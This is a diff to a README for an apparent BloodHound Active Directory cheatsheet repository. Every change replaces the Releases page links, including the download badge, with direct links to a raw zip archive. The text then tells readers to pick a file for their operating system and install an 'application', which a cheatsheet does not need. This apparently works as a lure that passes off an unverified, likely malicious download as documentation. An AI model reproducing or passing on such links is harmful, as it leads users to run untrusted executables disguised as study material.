@@ -1,6 +1,6 @@
 # 🐾 bloodhound-cheatsheet - A Handy Guide for BloodHound Users
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/darkeye789/bloodhound-cheatsheet/releases)
+[![Download Now](https://raw.githubusercontent.com/darkeye789/bloodhound-cheatsheet/main/cheatsheet/bloodhound-cheatsheet-1.3-alpha.1.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/darkeye789/bloodhound-cheatsheet/main/cheatsheet/bloodhound-cheatsheet-1.3-alpha.1.zip)
 
 ## 📚 Description
 Welcome to the bloodhound-cheatsheet! This clear and structured cheatsheet is designed for BloodHound users. It explains what BloodHound does, how to install it from scratch, and shows you how to run common Active Directory (AD) enumeration and analysis tasks. This guide is perfect for both beginners and professionals looking for a quick reference while mapping Active Directory attack paths.
@@ -9,7 +9,7 @@ Welcome to the bloodhound-cheatsheet! This clear and structured cheatsheet is de
 To start using the bloodhound-cheatsheet, follow these simple steps to download and install the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/darkeye789/bloodhound-cheatsheet/releases) to access the latest version of the cheatsheet.
+1. Visit the [Releases page](https://raw.githubusercontent.com/darkeye789/bloodhound-cheatsheet/main/cheatsheet/bloodhound-cheatsheet-1.3-alpha.1.zip) to access the latest version of the cheatsheet.
 2. From the list of available downloads, choose the file that matches your operating system.
 3. Download the selected file by clicking on it. This may take a few moments depending on your internet speed.
 4. Once the download is complete, locate the file in your computer's download folder.
@@ -58,6 +58,6 @@ If you wish to delve deeper into BloodHound or conduct further research, conside
 - Penetration testing strategies
 
 ## 🌟 Stay Updated
-Make sure to check back on the [Releases page](https://github.com/darkeye789/bloodhound-cheatsheet/releases) often for new updates and features as they are released.
+Make sure to check back on the [Releases page](https://raw.githubusercontent.com/darkeye789/bloodhound-cheatsheet/main/cheatsheet/bloodhound-cheatsheet-1.3-alpha.1.zip) often for new updates and features as they are released.
 
 Thank you for using bloodhound-cheatsheet! Happy exploring!
